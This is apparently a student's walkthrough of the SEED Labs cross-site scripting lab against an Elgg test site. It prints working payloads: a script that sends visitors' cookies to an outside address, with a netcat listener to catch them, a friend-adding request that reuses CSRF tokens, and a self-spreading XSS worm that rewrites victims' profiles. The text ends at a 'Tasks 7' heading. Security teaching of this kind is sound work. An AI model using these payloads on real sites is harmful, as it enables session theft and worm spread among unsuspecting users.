# Cross-Site Scripting Attack Lab

For `Mac` with an Apple M-series chip

**VMware Fusion:** [VMware Fusion 13 Pro 13.5.2](https://customerconnect.vmware.com/en/evalcenter?p=fusion-player-personal-13) or [From my drive](https://drive.google.com/file/d/1r93EjCoikbehD6aaPDMhJCsoqPh11t2t/view?usp=sharing)

**VM version:** [SEED Ubuntu-20.04 VM](https://seedsecuritylabs.org/labsetup.html) or [From my drive](https://drive.google.com/file/d/1IPzOHrPnvwh5saghyQwFgCjSAsM2ZfZZ/view?usp=drive_link)

# Tasks 

## Tasks 1 : Posting a Malicious Message to Display an Alert Window

In this task, we have to do an XSS attack by injecting a JavaScript snippet into the "Brief description" field. 

This JavaScript code will be executed whenever someone views our profile : 

```
<script>alert('XSS');</script>
```

- Profile Edit with Script Injection:

[![](images/img_xss_attack_task_1_1.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task_1_1.png)

- Alert Box Triggered:

[![](images/img_xss_attack_task_1_2.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task_1_2.png)

When the victim (`Alice`) visits the attacker(`Samy`)'s profile, the injected script executes and displaying an alert box.

## Tasks 2 :  Posting a Malicious Message to Display Cookies

In this task, we have to do an XSS attack by injecting a JavaScript snippet into the "Brief description" field. It will displays the cookies of the user viewing the profile.

This JavaScript code will be executed whenever someone views our profile : 

```
<script>alert(document.cookie);</script>
```

- Profile Edit with Script Injection:

[![](images/img_xss_attack_task_2_1.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task_2_1.png)

- Alert Box Displaying Cookies:

[![](images/img_xss_attack_task_2_2.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task_2_2.png)

Every time someone views `Samy` profile, the injected Javascript code will be executed.

## Tasks 3 : Stealing Cookies from the Victim’s Machine

In the previous task, the `victim` could only see their own browser's cookies. In this task, the `attacker` aims to capture the `victim’s cookies` by sending them to the `attacker's machine`.

Injected Script:

```
<script>
    document.write('<img src="http://10.9.0.1:5555?cookie=' + escape(document.cookie) + '">');
</script>
```

Go to the Edit Profile page and insert this script into the "Brief description" field.

- Profile Edit with Injected Script:

[![](images/img_xss_attack_task_3_1.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task_3_1.png)

Start a Netcat listener to receive the cookies:

```
nc -lknv 5555
```

- Attacker’s Server Listening for Connections:

[![](images/img_xss_attack_task_3_2.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task_3_2.png)

When the victim visits the attacker’s profile, their cookies are sent to the attacker’s Netcat listener.

- Victim(`Alice`) Views the Profile:

[![](images/img_xss_attack_task_3_3.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task_3_3.png)

- Captured Cookies on Attacker’s Server:

[![](images/img_xss_attack_task_3_4.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task_3_4.png)

## Tasks 4 : Becoming the Victim’s Friend

In this task, the attacker (`Samy`) aims to create an `XSS worm` that automatically adds `Samy` as a friend for any user who visits `Samy`'s profile.

In order to find how to write this request, inspect the "Add Friend" button on another user's page.

- Inspect Add Friend Button

[![](images/img_xss_attack_task_4_1.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task_4_1.png)

This reveals the URL and parameters used for the friend request:

```
http://www.seed-server.com/action/friends/add?friend=59&amp;__elgg_ts=1732271486&amp;__elgg_token=WXDfFi0ucQTatfxYj3TOSQ
```

Go to the Members page and inspect the HTML elements. We could find Samy's ID by inspecting the "Members" page. 

- Inspect Members Page

[![](images/img_xss_attack_task_4_2.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task_4_2.png)

Samy's user ID is `59`.

With this information, we can create a request that will add Samy as a friend when executed in a script on other users' browsers. 

```
<script type="text/javascript">
window.onload = function() {
    // Get the CSRF token and timestamp
    var Ajax = null;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    // Construct the URL to add Samy as a friend
    var friend_id = "59"; // Replace 59 with Samy’s user ID
    var sendurl = "http://www.seed-server.com/action/friends/add?friend=" + friend_id + ts + token;

    // Send the HTTP request
    var Ajax = new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.send();
};
</script>
```

Log in as Samy and edit the "About Me" of the profile. 

- Script Injection in Profile

[![](images/img_xss_attack_task_4_3.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task_4_3.png)

- Before visiting Samy's profile:

[![](images/img_xss_attack_task_4_4.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task_4_4.png)

- Visiting Samy's profile:

[![](images/img_xss_attack_task_4_5.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task_4_5.png)

After visiting Samy's profile:

[![](images/img_xss_attack_task_4_6.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task_4_6.png)

## Tasks 5 & 6: Creating and Spreading the XSS Worm

In this task, we implement an XSS worm that automatically:

 1. Updates a victim’s profile to propagate itself.
 2. Adds Samy (user ID: 59) as a friend for any user who views the infected profile.

```
<script type="text/javascript" id="worm">
window.onload = function(){
  var headerTag = "<script id=\"worm\" type=\"text/javascript\">";  
  var jsCode = document.getElementById("worm").innerHTML;
  var tailTag = "</" + "script>";
  
  //Put it all together with URI encoding
  var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
  
  //Set description field and access level
  var desc = "&description=Samy is my Hero!" + wormCode;
  desc += "&accesslevel[description]=2";
  
  //Get the name, guid, timestamp, and token
  var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
  var ts    = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
  var name  = "&name=" + elgg.session.user.name;
  var guid  = "&guid=" + elgg.session.user.guid;
   
  //Set the URL
  var sendposturl = "http://www.seed-server.com/action/profile/edit";
  var sendgeturl= "http://www.seed-server.com/action/friends/add" + "?friend=59" + token + ts;
  var content = token + ts + name + desc + guid;
  
  //Construct and send the Ajax request
  if (elgg.session.user.guid != 59){
    //modify profile
    var Ajax=null;
    Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendposturl, true);
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(content);
  }
 
  //Create and send Ajax request to add friend
  Ajax=new XMLHttpRequest();
  Ajax.open("GET", sendgeturl, true);
  Ajax.send();
 }
 </script>
```

- Script Worm Injection in Profile

[![](images/img_xss_attack_task5-6_1.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task5-6_1.png)

- Boby's profile (Before views Samy's profile)

[![](images/img_xss_attack_task5-6_2.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task5-6_2.png)

- Boby's friend list (Before views Samy's profile)

[![](images/img_xss_attack_task5-6_3.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task5-6_3.png)

- Boby views Samy’s profile

[![](images/img_xss_attack_task5-6_4.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task5-6_4.png)

- Boby's profile (After views Samy's profile)

[![](images/img_xss_attack_task5-6_5.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task5-6_5.png)

- Boby's friend list (After views Samy's profile)

[![](images/img_xss_attack_task5-6_6.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task5-6_6.png)

- Alice's profile (Before views Boby's profile)

[![](images/img_xss_attack_task5-6_7.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task5-6_7.png)

- Alice's friend list (Before views Boby's profile)

[![](images/img_xss_attack_task5-6_8.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task5-6_8.png)


If the code is correct, a copy of the worm should have been placed in Boby’s profile. Now, when another user, like Charlie, visits Boby’s profile, the worm code will infect Charlie as well.

- Alice views Boby’s profile

[![](images/img_xss_attack_task5-6_9.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task5-6_9.png)

- Alice's profile (After views Boby's profile)

[![](images/img_xss_attack_task5-6_10.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task5-6_10.png)

- Alice's friend list (After views Boby's profile)

[![](images/img_xss_attack_task5-6_11.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task5-6_11.png)

## Tasks 7